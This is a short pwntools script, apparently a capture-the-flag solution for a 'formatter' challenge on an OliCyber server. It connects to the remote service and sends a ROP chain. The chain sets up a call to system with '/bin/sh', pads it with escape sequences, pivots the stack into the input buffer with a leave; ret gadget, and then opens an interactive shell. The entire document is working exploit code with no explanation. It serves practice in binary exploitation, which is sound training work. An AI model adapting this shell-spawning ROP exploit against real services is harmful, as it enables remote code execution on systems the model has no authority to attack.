from pwn import *

r = remote("formatter.challs.olicyber.it", 20006)

payload = p64(0x004015e3)          # pop rdi ; ret
payload += p64(0x004050b8)          # &/bin/sh
payload += p64(0x00401236)          # system
payload += b"/bin/sh\x00"

payload += b"\\h" * 10

payload += p64(0x004050a0 - 8)          # ROP chain in user_input
payload += p64(0x00401253)          # leave; ret

r.recv(1000)
r.sendline(payload)
r.interactive()